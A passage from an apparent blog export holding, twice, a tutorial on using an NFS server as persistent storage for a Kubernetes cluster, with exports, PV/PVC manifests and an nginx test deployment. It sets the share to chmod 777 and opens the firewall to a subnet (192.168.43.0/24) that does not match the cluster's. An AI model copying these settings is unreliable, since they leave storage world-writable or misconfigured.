Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo mkdir /mnt/nfs-data \n```\nNow let's give it a read,write and execute privileges to all the contents inside the directory\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo chmod 777 /mnt/nfs-data\n```\n\nNow Lets add a new line to the `/etc/exports` configuration file.\n> The `/etc/exports` file indicates all directories that a nfs server exports to its clients. Each line in the file specifies a single directory.\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo vim /etc/exports\n```\nYou can provide access to a single client, multiple clients, or specify an entire subnet. In this guide, we have allowed an entire subnet to have access to the NFS share.\n``` vim\n/mnt/nfs-data 192.168.1.0/24(rw,sync,no_subtree_check)\n```\nAfter granting access to the subnet, let's export the NFS share directory and restart the NFS\n\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo exportfs -a\n4n6nk8s@4n6nk8s-nfs:~$ sudo systemctl restart nfs-kernel-server\n```\nLet's allow NFS access through the firewall\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo ufw allow from 192.168.43.0/24 to any port nfs\n```\n## Install the NFS Client on the Kubernetes Nodes\nWe must install the `nfs-common` packages to access to the NFS share so let's install it by running the following command on each node:\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-worker1:~$ sudo apt install nfs-common\n```\nThis command mount the NFS Share on one node for testing and sanity check only\n> The mount command is not a mandatory step. We mount for testing purposes. you can skip to the next section \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-worker1:~$ sudo mount 4n6nk8s-nfs:/mnt/nfs-data  /mnt\n```\nLet's Create a file for testing \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-worker1:~$ cd /mnt\n4n6nk8s@4n6nk8s-worker1:/mnt $ touch file \n```\nCheck the `/mnt/nfs-data` on the NFS server\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ cd /mnt/nfs-data\n4n6nk8s@4n6nk8s-nfs:/mnt/nfs-data$ ls\nfile \n```\n## Kubernetes with NFS remote Storage demo\nAfter Setting up the NFS server and install the NFS client on the kubernetes nodes. Now it's time to do some practice with `Persistent Volume` and `Persistent Volume Claim` with NFS storage.\n### Create a Persistent Volume with NFS\nExample of Persistent Volume manifest using nfs: \n``` yaml PersistentVolume\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv-nfs\nspec:\n  capacity:\n    storage: 100Mi\n  accessModes:\n    - ReadWriteMany\n  storageClassName: nfs\n  nfs:\n    server: 192.168.1.80 # the IP address of 4n6nk8s-nfs host\n    path: \"/mnt/nfs-data\"\n\n```\nMake sure to put the correct IP address of the NFS server and the correct NFS Share point!\nCreate the persistent volume using kubectl \n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pv.yaml\npersistentvolume/pv-nfs created\n```\nList the Persistent Volumes to make sure for the creation\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl get pv\nNAME     CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npv-nfs   100Mi      RWX            Retain           Available           nfs                     4s\n\n```\n### Create a Persistent Volume Claim with NFS\nExample of Persistent Volume Claim manifest using nfs: \n\n``` yaml PersistentVolumeClaim\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc-nfs\nspec:\n  accessModes:\n    - ReadWriteMany\n  storageClassName: nfs\n  resources:\n    requests:\n        storage: 100Mi\n\n```\nCreate the persistent volume using kubectl \n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pvc.yaml\npersistentvolumeclaim/pvc-nfs created\n```\nList the `Persistent Volumes Claims` to make sure for the creation\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl get pvc\nNAME      STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npvc-nfs   Bound    pv-nfs   100Mi      RWX            nfs            3s\n```\n### Create Nginx Deployment \nWe use the `volumeMounts` and `volumes `attributes in this manifest to use the persistent volume we created:\n``` yaml Deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n    name: nginx-deployment\n    labels:\n        role: webserver\nspec:\n    replicas: 3\n    selector:\n        matchLabels:\n            role: webserver\n    template:\n        metadata:\n            labels:\n                role: webserver\n        spec:\n            containers:\n            - name: frontend\n              image: nginx  # we use wrong image for the demo !\n              ports:\n                - name: nginx-port\n                  containerPort: 80\n              volumeMounts:\n                - name: nfs\n                  mountPath: /usr/share/nginx/html\n            volumes:\n            - name: nfs\n              persistentVolumeClaim:\n                claimName: pvc-nfs\n``` \nDeploy the `nginx-deployment.yaml` using the `kubectl apply -f`.\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml\ndeployment.apps/nginx-deployment created\n``` \nMake sure that the deployment was created without any problems!\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl get pods\nNAME                                READY   STATUS    RESTARTS   AGE\nnginx-deployment-7976956b49-fgbb4   1/1     Running   0          16s\nnginx-deployment-7976956b49-hzrmm   1/1     Running   0          16s\nnginx-deployment-7976956b49-kg5tx   1/1     Running   0          16s\n```\n### Sanity Check (Testing the NFS volumes):\nLet's get shell on one of the running containers and go to the mount point then create a file! \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl exec --stdin --tty nginx-deployment-7976956b49-fgbb4 -- /bin/bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/# ls\nbin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n```\nNow the shell is opened. Let's create a file in `/usr/share/nginx/html`:\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/# cd /usr/share/nginx/html/\n```\n We find the file created in the client test xD\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html# ls\nfile\n```\nCreate a file named \"hi from the other side!\"\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html# touch \"hi from the other side!\"\nroot@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html# ls\nfile  'hi from the other side!'\n```\nLet's open another shell on another running container: \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl exec --stdin --tty nginx-deployment-7976956b49-kg5tx -- /bin/bash Command Line Prompt\nroot@nginx-deployment-7976956b49-kg5tx:/# cd /usr/share/nginx/html/\n```\nBingoo! we find the same content on the same share point!\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html# ls\n file  'hi from the other side!'\nroot@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html# exit\n```\nNow we will try to delete the deployment and recreate another to check the data in the  persistent volume\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl delete -f nginx-deployment.yaml\ndeployment.apps \"nginx-deployment\" deleted\n\n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml\ndeployment.apps/nginx-deployment created\n```\nCheck the deployment created or not !\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~ kubectl get pods\nNAME                                READY   STATUS              RESTARTS   AGE\nnginx-deployment-7976956b49-7d5vw   1/1     Running             0          10s\nnginx-deployment-7976956b49-9r5gx   0/1     ContainerCreating   0          10s\nnginx-deployment-7976956b49-fdq7w   1/1     Running             0          10s\n```\nOpen another shell on running container from the new deployment to check the content of the persistent volume:\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl exec --stdin --tty nginx-deployment-7976956b49-7d5vw -- /bin/bash Command Line Prompt\nroot@nginx-deployment-7976956b49-7d5vw:/# cd /usr/share/nginx/html/\n```\nDisplay the content of the mount point `/usr/share/nginx/html/`\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html# ls\n file  'hi from the other side!'\nroot@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html# exit\nexit\n```\n\nBingoo! The content still in the persistent volume without any problem !","source":"_posts/Kubernetes/nfs-k8s.md","raw":"---\ntitle: NFS as Remote Storage for Kubernetes\ndate: 2022-09-10 23:26:58\ntags:\ncover: https://www.axigen.com/usr/files/articles/x118.png.pagespeed.ic.B1J-BES_Qy.png\ncategories:\n- [Kubernetes]\n---\n\nWe will setting up a NFS server to use it as remote storage for our cluster to create a lot of persistent volumes in our local infrastructure !\n\nWe Assume that we have 4 Ubuntu 20.04 LTS, The Kubernetes is installed and the `4n6nk8s-nfs` host in the same network with the cluster :\n| Role       | Hostname         | IP address      | \n| ---------- | ---------------- | --------------- |\n| Master     | 4n6nk8s-master   | 192.168.1.18/24 | \n| Worker     | 4n6nk8s-worker1  | 192.168.1.19/24 | \n| Worker     | 4n6nk8s-worker2  | 192.168.1.20/24 | \n| NFS Server | 4n6nk8s-nfs      | 192.168.1.80/24 |\n\n## What is a NFS (Network File System) Server:\nNetwork File System (NFS) is a networking protocol for distributed file sharing. A file system defines the way data in the form of files is stored and retrieved from storage devices, such as hard disk drives, solid-state drives and tape drives. NFS is a network file sharing protocol that defines the way files are stored and retrieved from storage devices across networks.\n\nThis distributed file system protocol allows a user on a client computer to access files over a network in the same way they would access a local storage file.\n## Setting up the NFS server \n\nWe need to install the `nfs-kernel-server` package on the NFS server. This package will store additional packages such as `nfs-common` and `4n6nk8s@rpcbind`\n``` bash Command Line Prompt\n4n6nk8s-nfs:~$ sudo apt install nfs-kernel-server\n```\nNow let's create an NFS Export Directory \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo mkdir /mnt/nfs-data \n```\nNow let's give it a read,write and execute privileges to all the contents inside the directory\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo chmod 777 /mnt/nfs-data\n```\n\nNow Lets add a new line to the `/etc/exports` configuration file.\n> The `/etc/exports` file indicates all directories that a nfs server exports to its clients. Each line in the file specifies a single directory.\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo vim /etc/exports\n```\nYou can provide access to a single client, multiple clients, or specify an entire subnet. In this guide, we have allowed an entire subnet to have access to the NFS share.\n``` vim\n/mnt/nfs-data 192.168.1.0/24(rw,sync,no_subtree_check)\n```\nAfter granting access to the subnet, let's export the NFS share directory and restart the NFS\n\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo exportfs -a\n4n6nk8s@4n6nk8s-nfs:~$ sudo systemctl restart nfs-kernel-server\n```\nLet's allow NFS access through the firewall\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ sudo ufw allow from 192.168.43.0/24 to any port nfs\n```\n## Install the NFS Client on the Kubernetes Nodes\nWe must install the `nfs-common` packages to access to the NFS share so let's install it by running the following command on each node:\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-worker1:~$ sudo apt install nfs-common\n```\nThis command mount the NFS Share on one node for testing and sanity check only\n> The mount command is not a mandatory step. We mount for testing purposes. you can skip to the next section \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-worker1:~$ sudo mount 4n6nk8s-nfs:/mnt/nfs-data  /mnt\n```\nLet's Create a file for testing \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-worker1:~$ cd /mnt\n4n6nk8s@4n6nk8s-worker1:/mnt $ touch file \n```\nCheck the `/mnt/nfs-data` on the NFS server\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-nfs:~$ cd /mnt/nfs-data\n4n6nk8s@4n6nk8s-nfs:/mnt/nfs-data$ ls\nfile \n```\n## Kubernetes with NFS remote Storage demo\nAfter Setting up the NFS server and install the NFS client on the kubernetes nodes. Now it's time to do some practice with `Persistent Volume` and `Persistent Volume Claim` with NFS storage.\n### Create a Persistent Volume with NFS\nExample of Persistent Volume manifest using nfs: \n``` yaml PersistentVolume\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv-nfs\nspec:\n  capacity:\n    storage: 100Mi\n  accessModes:\n    - ReadWriteMany\n  storageClassName: nfs\n  nfs:\n    server: 192.168.1.80 # the IP address of 4n6nk8s-nfs host\n    path: \"/mnt/nfs-data\"\n\n```\nMake sure to put the correct IP address of the NFS server and the correct NFS Share point!\nCreate the persistent volume using kubectl \n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pv.yaml\npersistentvolume/pv-nfs created\n```\nList the Persistent Volumes to make sure for the creation\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl get pv\nNAME     CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npv-nfs   100Mi      RWX            Retain           Available           nfs                     4s\n\n```\n### Create a Persistent Volume Claim with NFS\nExample of Persistent Volume Claim manifest using nfs: \n\n``` yaml PersistentVolumeClaim\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc-nfs\nspec:\n  accessModes:\n    - ReadWriteMany\n  storageClassName: nfs\n  resources:\n    requests:\n        storage: 100Mi\n\n```\nCreate the persistent volume using kubectl \n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pvc.yaml\npersistentvolumeclaim/pvc-nfs created\n```\nList the `Persistent Volumes Claims` to make sure for the creation\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl get pvc\nNAME      STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npvc-nfs   Bound    pv-nfs   100Mi      RWX            nfs            3s\n```\n### Create Nginx Deployment \nWe use the `volumeMounts` and `volumes `attributes in this manifest to use the persistent volume we created:\n``` yaml Deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n    name: nginx-deployment\n    labels:\n        role: webserver\nspec:\n    replicas: 3\n    selector:\n        matchLabels:\n            role: webserver\n    template:\n        metadata:\n            labels:\n                role: webserver\n        spec:\n            containers:\n            - name: frontend\n              image: nginx  # we use wrong image for the demo !\n              ports:\n                - name: nginx-port\n                  containerPort: 80\n              volumeMounts:\n                - name: nfs\n                  mountPath: /usr/share/nginx/html\n            volumes:\n            - name: nfs\n              persistentVolumeClaim:\n                claimName: pvc-nfs\n``` \nDeploy the `nginx-deployment.yaml` using the `kubectl apply -f`.\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml\ndeployment.apps/nginx-deployment created\n``` \nMake sure that the deployment was created without any problems!\n``` bash Command Line Prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl get pods\nNAME                                READY   STATUS    RESTARTS   AGE\nnginx-deployment-7976956b49-fgbb4   1/1     Running   0          16s\nnginx-deployment-7976956b49-hzrmm   1/1     Running   0          16s\nnginx-deployment-7976956b49-kg5tx   1/1     Running   0          16s\n```\n### Sanity Check (Testing the NFS volumes):\nLet's get shell on one of the running containers and go to the mount point then create a file! \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl exec --stdin --tty nginx-deployment-7976956b49-fgbb4 -- /bin/bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/# ls\nbin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n```\nNow the shell is opened. Let's create a file in `/usr/share/nginx/html`:\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/# cd /usr/share/nginx/html/\n```\n We find the file created in the client test xD\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html# ls\nfile\n```\nCreate a file named \"hi from the other side!\"\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html# touch \"hi from the other side!\"\nroot@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html# ls\nfile  'hi from the other side!'\n```\nLet's open another shell on another running container: \n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl exec --stdin --tty nginx-deployment-7976956b49-kg5tx -- /bin/bash Command Line Prompt\nroot@nginx-deployment-7976956b49-kg5tx:/# cd /usr/share/nginx/html/\n```\nBingoo! we find the same content on the same share point!\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html# ls\n file  'hi from the other side!'\nroot@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html# exit\n```\nNow we will try to delete the deployment and recreate another to check the data in the  persistent volume\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl delete -f nginx-deployment.yaml\ndeployment.apps \"nginx-deployment\" deleted\n\n4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml\ndeployment.apps/nginx-deployment created\n```\nCheck the deployment created or not !\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~ kubectl get pods\nNAME                                READY   STATUS              RESTARTS   AGE\nnginx-deployment-7976956b49-7d5vw   1/1     Running             0          10s\nnginx-deployment-7976956b49-9r5gx   0/1     ContainerCreating   0          10s\nnginx-deployment-7976956b49-fdq7w   1/1     Running             0          10s\n```\nOpen another shell on running container from the new deployment to check the content of the persistent volume:\n``` bash Command Line Prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl exec --stdin --tty nginx-deployment-7976956b49-7d5vw -- /bin/bash Command Line Prompt\nroot@nginx-deployment-7976956b49-7d5vw:/# cd /usr/share/nginx/html/\n```\nDisplay the content of the mount point `/usr/share/nginx/html/`\n``` bash Command Line Prompt\nroot@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html# ls\n file  'hi from the other side!'\nroot@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html# exit\nexit\n```\n\nBingoo! The content still in the persistent volume without any problem !","slug":"Kubernetes/nfs-k8s","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnl000ed5qf5e3h3gpw","content":"<p>We will setting up a NFS server to use it as remote storage for our cluster to create a lot of persistent volumes in our local infrastructure !</p>\n<p>We Assume that we have 4 Ubuntu 20.04 LTS, The Kubernetes is installed and the  <code>4n6nk8s-nfs</code>  host in the same network with the cluster :</p>\n<table>\n<thead>\n<tr>\n<th>Role</th>\n<th>Hostname</th>\n<th>IP address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Master</td>\n<td>4n6nk8s-master</td>\n<td>192.168.1.18/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker1</td>\n<td>192.168.1.19/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker2</td>\n<td>192.168.1.20/24</td>\n</tr>\n<tr>\n<td>NFS Server</td>\n<td>4n6nk8s-nfs</td>\n<td>192.168.1.80/24</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"what-is-a-nfs-network-file-system-server\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-nfs-network-file-system-server\">#</a> What is a NFS (Network File System) Server:</h2>\n<p>Network File System (NFS) is a networking protocol for distributed file sharing. A file system defines the way data in the form of files is stored and retrieved from storage devices, such as hard disk drives, solid-state drives and tape drives. NFS is a network file sharing protocol that defines the way files are stored and retrieved from storage devices across networks.</p>\n<p>This distributed file system protocol allows a user on a client computer to access files over a network in the same way they would access a local storage file.</p>\n<h2 id=\"setting-up-the-nfs-server\"><a class=\"markdownIt-Anchor\" href=\"#setting-up-the-nfs-server\">#</a> Setting up the NFS server</h2>\n<p>We need to install the  <code>nfs-kernel-server</code>  package on the NFS server. This package will store additional packages such as  <code>nfs-common</code>  and  <code>4n6nk8s@rpcbind</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s-nfs:~$ sudo apt install nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>Now let’s create an NFS Export Directory</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo <span class=\"built_in\">mkdir</span> /mnt/nfs-data </span><br></pre></td></tr></table></figure>\n<p>Now let’s give it a read,write and execute privileges to all the contents inside the directory</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo <span class=\"built_in\">chmod</span> 777 /mnt/nfs-data</span><br></pre></td></tr></table></figure>\n<p>Now Lets add a new line to the  <code>/etc/exports</code>  configuration file.</p>\n<blockquote>\n<p>The  <code>/etc/exports</code>  file indicates all directories that a nfs server exports to its clients. Each line in the file specifies a single directory.</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo vim /etc/exports</span><br></pre></td></tr></table></figure>\n<p>You can provide access to a single client, multiple clients, or specify an entire subnet. In this guide, we have allowed an entire subnet to have access to the NFS share.</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/nfs-data <span class=\"number\">192.168</span>.<span class=\"number\">1.0</span>/<span class=\"number\">24</span>(rw,<span class=\"keyword\">sync</span>,no_subtree_check)</span><br></pre></td></tr></table></figure>\n<p>After granting access to the subnet, let’s export the NFS share directory and restart the NFS</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo exportfs -a</span><br><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo systemctl restart nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>Let’s allow NFS access through the firewall</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo ufw allow from 192.168.43.0/24 to any port nfs</span><br></pre></td></tr></table></figure>\n<h2 id=\"install-the-nfs-client-on-the-kubernetes-nodes\"><a class=\"markdownIt-Anchor\" href=\"#install-the-nfs-client-on-the-kubernetes-nodes\">#</a> Install the NFS Client on the Kubernetes Nodes</h2>\n<p>We must install the  <code>nfs-common</code>  packages to access to the NFS share so let’s install it by running the following command on each node:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo apt install nfs-common</span><br></pre></td></tr></table></figure>\n<p>This command mount the NFS Share on one node for testing and sanity check only</p>\n<blockquote>\n<p>The mount command is not a mandatory step. We mount for testing purposes. you can skip to the next section</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo mount 4n6nk8s-nfs:/mnt/nfs-data  /mnt</span><br></pre></td></tr></table></figure>\n<p>Let’s Create a file for testing</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ <span class=\"built_in\">cd</span> /mnt</span><br><span class=\"line\">4n6nk8s@4n6nk8s-worker1:/mnt $ <span class=\"built_in\">touch</span> file </span><br></pre></td></tr></table></figure>\n<p>Check the  <code>/mnt/nfs-data</code>  on the NFS server</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ <span class=\"built_in\">cd</span> /mnt/nfs-data</span><br><span class=\"line\">4n6nk8s@4n6nk8s-nfs:/mnt/nfs-data$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">file </span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-with-nfs-remote-storage-demo\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-with-nfs-remote-storage-demo\">#</a> Kubernetes with NFS remote Storage demo</h2>\n<p>After Setting up the NFS server and install the NFS client on the kubernetes nodes. Now it’s time to do some practice with  <code>Persistent Volume</code>  and  <code>Persistent Volume Claim</code>  with NFS storage.</p>\n<h3 id=\"create-a-persistent-volume-with-nfs\"><a class=\"markdownIt-Anchor\" href=\"#create-a-persistent-volume-with-nfs\">#</a> Create a Persistent Volume with NFS</h3>\n<p>Example of Persistent Volume manifest using nfs:</p>\n<figure class=\"highlight yaml\"><figcaption><span>PersistentVolume</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">PersistentVolume</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pv-nfs</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">capacity:</span></span><br><span class=\"line\">    <span class=\"attr\">storage:</span> <span class=\"string\">100Mi</span></span><br><span class=\"line\">  <span class=\"attr\">accessModes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">ReadWriteMany</span></span><br><span class=\"line\">  <span class=\"attr\">storageClassName:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">  <span class=\"attr\">nfs:</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.80</span> <span class=\"comment\"># the IP address of 4n6nk8s-nfs host</span></span><br><span class=\"line\">    <span class=\"attr\">path:</span> <span class=\"string\">&quot;/mnt/nfs-data&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Make sure to put the correct IP address of the NFS server and the correct NFS Share point!<br>\nCreate the persistent volume using kubectl</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pv.yaml</span><br><span class=\"line\">persistentvolume/pv-nfs created</span><br></pre></td></tr></table></figure>\n<p>List the Persistent Volumes to make sure for the creation</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pv</span><br><span class=\"line\">NAME     CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE</span><br><span class=\"line\">pv-nfs   100Mi      RWX            Retain           Available           nfs                     4s</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"create-a-persistent-volume-claim-with-nfs\"><a class=\"markdownIt-Anchor\" href=\"#create-a-persistent-volume-claim-with-nfs\">#</a> Create a Persistent Volume Claim with NFS</h3>\n<p>Example of Persistent Volume Claim manifest using nfs:</p>\n<figure class=\"highlight yaml\"><figcaption><span>PersistentVolumeClaim</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">PersistentVolumeClaim</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pvc-nfs</span></span><br><span 